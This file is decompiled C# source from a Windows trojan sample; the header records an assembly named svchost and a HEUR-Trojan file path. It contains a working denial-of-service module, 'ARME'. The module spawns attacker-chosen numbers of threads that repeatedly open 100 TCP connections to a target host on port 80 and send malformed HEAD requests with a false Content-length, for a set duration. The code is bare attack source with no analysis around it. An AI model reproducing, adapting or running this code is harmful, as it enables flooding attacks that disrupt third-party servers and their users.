// Decompiled with JetBrains decompiler
// Type: svchost.DDOS.ARME
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace svchost.DDOS
{
  [OptionText]
  [StandardModule]
  public sealed class ARME
  {
    private static object ThreadsEnded = (object) 0;
    private static string PostDATA;
    private static string HostToAttack;
    private static int TimetoAttack;
    private static int ThreadstoUse;
    private static Thread[] Threads;
    private static bool AttackRunning = false;
    private static int Attacks = 0;

    public static void StartARME(string Host, int Threadsto, int Time, string data)
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        if (!ARME.AttackRunning)
        {
label_1:
          ProjectData.ClearProjectError();
          num1 = 1;
        }
        else
          goto label_20;
label_2:
        num3 = 3;
        ARME.AttackRunning = true;
label_3:
        num3 = 4;
        ARME.HostToAttack = Host;
label_4:
        num3 = 5;
        ARME.PostDATA = data;
label_5:
        num3 = 6;
        ARME.ThreadstoUse = Threadsto;
label_6:
        num3 = 7;
        ARME.TimetoAttack = Time;
label_7:
        num3 = 8;
        if (!ARME.HostToAttack.Contains("http://"))
          goto label_9;
label_8:
        num3 = 9;
        ARME.HostToAttack = ARME.HostToAttack.Replace("http://", string.Empty);
label_9:
        num3 = 11;
        if (!ARME.HostToAttack.Contains("www."))
          goto label_11;
label_10:
        num3 = 12;
        ARME.HostToAttack = ARME.HostToAttack.Replace("www.", string.Empty);
label_11:
        num3 = 14;
        if (!ARME.HostToAttack.Contains("/"))
          goto label_13;
label_12:
        num3 = 15;
        ARME.HostToAttack = ARME.HostToAttack.Replace("/", string.Empty);
label_13:
        num3 = 17;
        ARME.Threads = new Thread[checked (Threadsto - 1 + 1)];
label_14:
        num3 = 18;
        int num4 = checked (Threadsto - 1);
        int index = 0;
        goto label_19;
label_15:
        num3 = 19;
        ARME.Threads[index] = new Thread(new ThreadStart(ARME.DoWork));
label_16:
        num3 = 20;
        ARME.Threads[index].IsBackground = true;
label_17:
        num3 = 21;
        ARME.Threads[index].Start();
label_18:
        num3 = 22;
        checked { ++index; }
label_19:
        if (index <= num4)
          goto label_15;
        else
          goto label_27;
label_20:
        goto label_27;
label_22:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
              case 11:
                goto label_9;
              case 12:
                goto label_10;
              case 13:
              case 14:
                goto label_11;
              case 15:
                goto label_12;
              case 16:
              case 17:
                goto label_13;
              case 18:
                goto label_14;
              case 19:
                goto label_15;
              case 20:
                goto label_16;
              case 21:
                goto label_17;
              case 22:
                goto label_18;
              case 23:
              case 25:
              case 26:
                goto label_27;
              case 24:
                goto label_20;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_22;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_27:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static void lol()
    {
      ARME.ThreadsEnded = Operators.AddObject(ARME.ThreadsEnded, (object) 1);
      if (!Operators.ConditionalCompareObjectEqual(ARME.ThreadsEnded, (object) ARME.ThreadstoUse, true))
        return;
      ARME.ThreadsEnded = (object) 0;
      ARME.ThreadstoUse = 0;
      ARME.AttackRunning = false;
      ARME.Attacks = 0;
    }

    public static void StopARME()
    {
      if (!ARME.AttackRunning)
        return;
      int num = checked (ARME.ThreadstoUse - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          ARME.Threads[index].Abort();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      ARME.AttackRunning = false;
      ARME.Attacks = 0;
    }

    private static void DoWork()
    {
      try
      {
        Socket[] socketArray = new Socket[100];
        TimeSpan timeSpan = TimeSpan.FromSeconds((double) ARME.TimetoAttack);
        Stopwatch stopwatch = Stopwatch.StartNew();
        while (stopwatch.Elapsed < timeSpan)
        {
          try
          {
            WebClient webClient = new WebClient();
            int index1 = 0;
            do
            {
              socketArray[index1] = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
              socketArray[index1].Connect(Dns.GetHostAddresses(ARME.HostToAttack), 80);
              socketArray[index1].Send(Encoding.Default.GetBytes("HEAD / HTTP/1.1\r\nHost: " + ARME.HostToAttack.ToString() + "\r\nContent-length: 5235\r\n\r\n"));
              checked { ++ARME.Attacks; }
              checked { ++index1; }
            }
            while (index1 <= 99);
            int index2 = 0;
            do
            {
              socketArray[index2].Close();
              checked { ++index2; }
            }
            while (index2 <= 99);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      ARME.lol();
    }
  }
}
